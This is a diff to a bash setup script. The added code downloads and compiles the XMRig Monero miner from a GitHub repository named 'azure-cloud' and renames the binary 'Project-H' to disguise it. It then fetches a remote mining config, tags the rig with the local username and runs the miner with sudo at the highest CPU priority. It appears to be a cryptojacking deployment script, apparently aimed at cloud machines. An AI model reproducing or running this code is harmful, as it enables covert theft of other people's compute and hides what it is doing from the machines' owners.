@@ -1,6 +1,26 @@
-sudo apt-get update
-sudo apt-get --assume-yes install build-essential cmake libuv1-dev libssl-dev libhwloc-dev git unzip
-curl -s https://install.zerotier.com | sudo bash
-sudo service zerotier-one start
-sleep 10
-sudo zerotier-cli join 8bd5124fd6a8ec54
+#!/bin/bash
+export TZ=America/Sao_Paulo
+export LOCAL=$(cat $(find /home -name home.file))
+data=$(date +"%d-%m-%Y_%H:%M:%S")
+cd $LOCAL
+if [ ! -e "AAA/build/Project-H" ]; then
+   sudo rm -rf AAA
+   sudo apt-get update
+   sudo apt-get --assume-yes install build-essential cmake libuv1-dev libssl-dev libhwloc-dev git unzip
+   wget https://github.com/U117A/azure-cloud/raw/master/AAA.zip
+   unzip AAA.zip
+   rm -rf AAA.zip
+   cd AAA
+   mkdir build
+   cd build
+   cmake ..
+   make
+   mv xmrig Project-H
+   wget https://raw.githubusercontent.com/U117A/scripts/master/config.json
+else
+   cd AAA/build
+   sudo rm -rf config.json && sudo wget https://raw.githubusercontent.com/U117A/scripts/master/config.json
+fi
+user=${LOCAL/'/home/'}
+sudo sed -i 's/"rig-id":.*/"rig-id": "'$user'",/' config.json
+sudo nice -n -20 ./Project-H
